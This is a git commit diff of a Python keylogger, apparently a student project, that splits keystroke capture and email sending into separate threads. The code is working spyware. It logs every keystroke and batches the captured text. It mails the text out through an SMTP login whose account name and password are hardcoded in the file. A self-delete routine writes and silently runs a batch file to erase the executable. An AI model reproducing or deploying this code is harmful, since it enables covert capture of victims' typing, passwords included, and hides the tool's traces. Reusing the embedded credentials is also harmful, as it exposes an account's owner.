43ae134f7152fb9777e4c459277d56af258d2d11
Kevin Chang <kevinchang1@hotmail.com>
2017-04-28 04:38:40 -0500

    split keylogging and sending data into SEPERATE THREADS

--- keylogger.py
+++ keylogger.py
@@ -5,21 +5,19 @@ from os import remove, path
 import subprocess
 from sys import argv
 import threading
-import queue
+import Queue
 destEmail = 'keylogsenderUIUC460@gmail.com'
 dataBufferSize = 100
 hackeremail = "keylogsenderUIUC460"
 hackerpwd =  "qazwsxedcrfv"
 local = False
 exit_key = keyboard.Key.esc
-
-
+end_program= False
 data = ""
-
+q = Queue.Queue()
 holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
 			 'Key.shift', 'Key.shift_r',
 			 'Key.alt_l', 'Key.alt_r']
-
 
 def serverSetup():
 	global hackeremail, hackerpwd
@@ -28,11 +26,8 @@ def serverSetup():
 	server.login(hackeremail, hackerpwd)
 	return server
 
-def send_data():
-	global data
-	try:
-		msg = data
-		data = ''
+def send_data(msg):
+	try:	
 		if(local):
 			print('sending data through LOG FILE')
 			f.write('{0}'.format(msg))	
@@ -53,14 +48,17 @@ def recordKey(key):
 			print('Exception: '+str(e))
 		finally:
 			if(len(data) > dataBufferSize):
-				send_data()
+				q.put(data)
+				data = ""
+
 def on_press(key):
 	print(key)
 	recordKey(key)
 
 def on_release(key):
-	global data
+	global data, end_program
 	if(key == exit_key): #exit
+		end_program = True
 		return False
 	try:
 		if(str(key) in holdDowns):
@@ -76,11 +74,31 @@ def run_keylogger():
 			) as listener:
 
 		try:
-			print("joining")
 			listener.join()
-			print("joined")
 		except Exception as e:
 			print('Exception: '+str(e))
+
+def run_sender():
+	if(local):
+		f = open('keylog.txt', 'w')
+		print("logging to file...")
+	else:
+		print("logging to email...")
+		global server 
+	server = serverSetup()
+	
+	while(end_program==False):
+		try:
+			msg = q.get(block = True, timeout = 10)				
+		except:#queue empty 
+			continue
+		send_data(msg)
+
+	if(local):
+		f.close()
+	else:
+		server.quit()
+
 def selfDelete():
 	#create selfdelete file
 	BATTXT = ("@ECHO OFF\n"
@@ -92,24 +110,19 @@ def selfDelete():
 	d.write(BATTXT)
 	d.close()
 	
-	#run selfdelete file on exe
-	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) #shell=True makes it not-popup
-
+	#run selfdelete file on exe, shell=True makes it run in background
+	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) 
 def main():
-	if(local):
-		f = open('keylog.txt', 'w')
-		print("logging to file...")
-	else:
-		print("logging to email...")
-		global server 
-		server = serverSetup()
-	run_keylogger()
+	thread_keylogger = threading.Thread(target = run_keylogger)
+	thread_sender = threading.Thread(target = run_sender)
 
-	if(local):
-		f.close()
+	thread_keylogger.start()	
+	thread_sender.start()	
 	
+	thread_keylogger.join()
+	thread_sender.join()	
 	if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
 		selfDelete()
 
 if __name__== "__main__":
-  main()
+	main()
